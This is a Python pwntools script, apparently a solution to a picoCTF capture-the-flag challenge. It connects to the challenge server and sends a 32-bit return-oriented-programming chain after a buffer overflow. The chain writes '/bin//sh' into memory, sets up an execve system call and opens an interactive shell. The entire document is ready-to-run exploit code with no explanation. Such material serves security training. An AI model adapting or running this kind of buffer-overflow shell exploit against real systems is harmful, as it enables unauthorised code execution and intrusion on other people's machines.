from pwn import *
from struct import pack

# p = process("./vuln")
io = remote("saturn.picoctf.net", 52999)

p = b"A" * 28
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"/bin"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5064)  # @ .data + 4
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x080B073A)  # pop eax ; ret
p += b"//sh"
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x41414141)  # padding
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
p += pack("<I", 0x080590F2)  # mov dword ptr [edx], eax ; ret
p += pack("<I", 0x08049022)  # pop ebx ; ret
p += pack("<I", 0x080E5060)  # @ .data
p += pack("<I", 0x08049E29)  # pop ecx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080583B9)  # pop edx ; pop ebx ; ret
p += pack("<I", 0x080E5068)  # @ .data + 8
p += pack("<I", 0x080E5060)  # padding without overwrite ebx
p += pack("<I", 0x0804FB80)  # xor eax, eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0808054E)  # inc eax ; ret
p += pack("<I", 0x0804A3C2)  # int 0x80

data = io.recvline().rstrip().decode()
print(data)
print(p)
io.sendline(p)
io.interactive()